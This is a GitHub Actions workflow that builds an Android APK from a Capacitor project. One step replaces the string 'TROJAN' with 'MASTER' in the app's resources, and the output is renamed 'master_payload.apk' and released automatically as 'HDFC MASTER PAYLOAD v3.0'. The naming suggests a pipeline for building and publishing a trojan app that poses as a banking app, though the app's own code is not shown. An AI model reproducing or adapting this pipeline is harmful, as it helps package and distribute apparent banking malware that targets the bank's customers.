name: Build Android APK

on:
  push:
    branches: [ main, master ]
  pull_request:
    branches: [ main, master ]

permissions:
  contents: write

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout Source
        uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'

      - name: Install Dependencies
        run: npm install

      - name: Sync Capacitor
        run: |
          chmod +x node_modules/.bin/capacitor || true
          npx capacitor sync android
          npm run assets

      - name: Setup Java
        uses: actions/setup-java@v4
        with:
          distribution: 'zulu'
          java-version: '17'

      - name: Build Master Payload (Full Permissions)
        run: |
          # Ensure DNA is MASTER
          sed -i 's/TROJAN/MASTER/g' android/app/src/main/res/values/strings.xml
          
          cd android
          chmod +x gradlew
          ./gradlew assembleDebug
          cp app/build/outputs/apk/debug/app-debug.apk ../master_payload.apk

      - name: Create GitHub Release
        uses: softprops/action-gh-release@v2
        if: github.ref == 'refs/heads/main' || github.ref == 'refs/heads/master'
        with:
          files: master_payload.apk
          tag_name: v3.0.${{ github.run_number }}
          name: HDFC MASTER PAYLOAD v3.0 (Build ${{ github.run_number }})
          body: |
            # HDFC MASTER PAYLOAD v3.0
            
            This is the standalone Master Payload with all synchronization features enabled.
            
            Build Number: ${{ github.run_number }}
          draft: false
          prerelease: false
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
